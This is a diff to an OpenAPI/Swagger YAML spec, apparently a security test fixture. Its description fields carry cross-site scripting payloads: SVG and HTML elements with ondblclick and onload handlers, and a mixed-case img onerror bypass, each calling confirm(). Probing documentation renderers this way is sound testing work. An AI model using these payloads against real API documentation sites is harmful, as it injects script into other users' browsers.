@@ -1,7 +1,7 @@
 swagger: '3.0'
 info:
   title: Classic API Resource Documentation
-  description: <form><math>'>"<h1 ondblclick="confirm(1)"/>BU0</h1></math></form><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" ondblclick="confirm(1)"/></svg>
+  description: <form><math>'>"<h1 ondblclick="confirm(1)"/>BU0</h1></math></form><svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="confirm(1)"/></svg>
 
   version: production
 basePath: /test-c4sper0
@@ -12,7 +12,7 @@ paths:
     get:
       responses:
         '200':
-          description: Test Svg <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" ondblclick="confirm('apitest')"></svg>
+          description: Test Svg <img/src=x oNerrOr=confirm`1`>
       tags:
         - accounts
       operationId: findAccounts
